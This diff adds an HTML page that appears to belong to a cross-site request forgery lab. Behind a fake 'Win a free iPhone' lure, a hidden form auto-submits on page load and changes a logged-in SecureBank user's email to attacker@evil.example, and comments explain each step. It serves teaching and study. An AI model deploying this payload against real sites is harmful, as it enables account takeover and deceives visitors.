@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Win a free iPhone! 🎁</title>
+</head>
+<body style="font-family: sans-serif; max-width: 480px; margin: 60px auto;">
+  <h1>🎁 Congratulations!</h1>
+  <p>You are today's lucky visitor. Loading your free prize…</p>
+
+  <!--
+    THE ATTACK.
+    This hidden form targets the victim app on its OWN origin
+    (http://localhost:8090). The victim is a *different* site from this one
+    (http://127.0.0.1:9090), so this is a genuine cross-site request.
+
+    When this page loads, the JavaScript below submits the form automatically.
+    The visitor does not click anything and does not see the form.
+
+    Because the form posts to localhost:8090, the browser automatically
+    attaches the visitor's SecureBank session cookie — so to the server it
+    looks exactly like a real request from the logged-in user.
+  -->
+  <form id="forge" action="http://localhost:8090/change_email.php" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+
+  <script>
+    // Fire the forged request the instant the page loads.
+    document.getElementById('forge').submit();
+  </script>
+</body>
+</html>
